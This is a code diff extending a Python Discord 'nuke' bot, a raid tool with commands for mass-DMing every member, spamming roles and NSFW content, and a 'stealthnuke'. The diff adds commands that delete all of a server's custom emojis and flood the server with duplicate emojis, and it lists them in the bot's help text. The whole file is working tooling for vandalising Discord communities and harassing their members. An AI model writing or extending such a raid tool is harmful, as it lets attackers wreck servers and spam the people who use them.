@@ -4,6 +4,7 @@ from discord import Permissions
 from colorama import Fore, Style
 from pystyle import Colors, Colorate, Center, Write, Box
 from threading import Thread
+from io import BytesIO
 
 
 with open('config.json') as config_file:
@@ -18,6 +19,8 @@ ActivityStatus = data['ActivityStatus']
 NsfwSpam = data['NsfwSpam']
 RoleSpamAmount = data['RoleSpamAmount']
 RoleSpamName = data['RoleSpamName']
+EmojiName = data['EmojiName']
+EmojiSpamAmount = data['EmojiSpamAmount']
 
 SPAM_MESSAGE = [SpamMessage]
 
@@ -180,7 +183,6 @@ Creator's Website -- iliyaa.tk
         async def messageall(ctx, *, messagename):
             await ctx.message.delete()
             for member in list(client.get_all_members()):
-                await asyncio.sleep(0)
                 try:
                     await asyncio.sleep(int(MessageAllSpeed))
                     await member.send(messagename)
@@ -228,9 +230,37 @@ Creator's Website -- iliyaa.tk
         async def rolespam(ctx):
             await ctx.message.delete()
             guild = ctx.guild
-            for i in range(int(RoleSpamAmount)):
-                await guild.create_role(name=RoleSpamName)
-                print(Fore.GREEN + f'Successfully created role: {RoleSpamName}' + Fore.RESET)
+            try:
+                for i in range(int(RoleSpamAmount)):
+                    await guild.create_role(name=RoleSpamName)
+                    print(Fore.GREEN + f'Successfully created role: {RoleSpamName}' + Fore.RESET)
+            except:
+                print(Fore.Magenta + 'Could Not Create Role!' + Fore.RESET)
+
+        @client.command(pass_context=True)
+        async def delemoji(ctx):
+              await ctx.message.delete()
+              for emoji in list(ctx.guild.emojis):
+                try:
+                    await asyncio.sleep(1)
+                    await emoji.delete()
+                    print (Fore.GREEN + f"{emoji.name} has been deleted" + Fore.MAGENTA)
+                except:
+                    pass
+
+        @client.command()
+        async def emojispam(ctx):
+            await ctx.message.delete()
+            guild = ctx.guild
+            for i in range(int(EmojiSpamAmount)):
+                try:
+                    with open("emoji.jpg", "rb") as emoji:
+                        image = emoji.read()
+                    await ctx.guild.create_custom_emoji(name=EmojiName, image=image, roles=None, reason=None)
+                    print(Fore.GREEN + "Created emoji!" + Fore.RESET)
+                except:
+                    print(Fore.MAGENTA + "Could not create emoji!" + Fore.RESET)
+
 
         @client.command()
         async def commands(ctx):
@@ -246,7 +276,9 @@ Creator's Website -- iliyaa.tk
 .nfswspam
 .stop
 .commands
-.stealthnuke''')
+.stealthnuke
+.emojispam
+.delemoji''')
                 print(Fore.GREEN + "You have been dmed the commands." + Fore.RESET)
             except:
                 print(Fore.GREEN + "Unable to DM commands." + Fore.RESET)
